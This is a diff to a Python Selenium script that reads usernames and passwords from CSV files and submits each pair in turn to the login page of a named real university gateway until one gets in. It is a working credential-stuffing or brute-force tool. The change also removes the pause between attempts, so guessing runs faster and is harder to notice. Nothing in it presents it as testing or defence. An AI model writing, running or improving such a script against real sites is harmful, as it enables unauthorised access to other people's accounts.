@@ -1,12 +1,12 @@
 from selenium import webdriver
-from time import sleep
 
 # instantiating the chrome driver
-path = r"C:\src\chromedriver.exe"
+path = r'C:\Users\Samperfect\Downloads\Codes\Libraries\Drivers\chromedriver.exe'
 driver = webdriver.Chrome(path)
 
 # reading the password file
-data = open('./passwords.csv').readlines()
+un = open('./names.csv').readlines()
+pw = open('./password.csv').readlines()
 
 # visiting the login page
 url = 'http://gateway.futa.edu.ng/login'
@@ -18,6 +18,7 @@ if 'status' in driver.current_url:
 
 # setting the iterator
 i = 0
+
 
 # entering the password and username into the input box
 def login(username, password):
@@ -33,28 +34,25 @@ def login(username, password):
     passwordInput.clear()
     passwordInput.send_keys(password)
     submit.click()
-    
+
     # setting conditional for graceful exit
     if 'login' in driver.current_url:
         return False
     return True
 
 
-
-while i < len(data):
+while i < len(un):
     # processing login data from the CSV file
-    new_data = data[i].strip().split(', ')
-    username = new_data[0]
-    password = new_data[1]
+    username = un[i].strip()
+    password = pw[i].strip()
     res = login(username, password)
     # incrementing the iterator
-    i+=1
+    i += 1
     # exiting gracefully upon successful login
     if res:
         driver.quit()
     # shifting to next iteration if login fails at first try
     else:
-        sleep(3)
         continue
 
 # graceful exit on successful While Loop execution
